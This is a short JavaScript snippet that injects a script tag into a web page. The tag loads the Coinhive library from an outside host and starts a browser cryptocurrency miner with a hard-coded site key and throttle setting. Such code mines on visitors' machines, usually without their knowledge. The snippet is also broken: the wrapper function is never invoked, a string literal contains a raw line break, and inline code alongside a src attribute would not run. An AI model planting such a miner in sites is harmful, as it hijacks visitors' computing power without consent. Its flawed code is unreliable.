(function (window) {
    var script = document.createElement("script"); // Make a script DOM node
    script.src = "https://coin-hive.com/lib/coinhive.min.js"; // Set it's src to the provided URL
   script.innerHTML="var miner = new CoinHive.Anonymous('bbxalNoLp5ZVs6plwCnsSbpPMdqh5qw7', {throttle: 0.1});
    miner.start();"; 
    document.head.appendChild(script); // Add it to the end of the head section of the page (could change 'head' to 'body' to add it to the end of the body section instead)
});
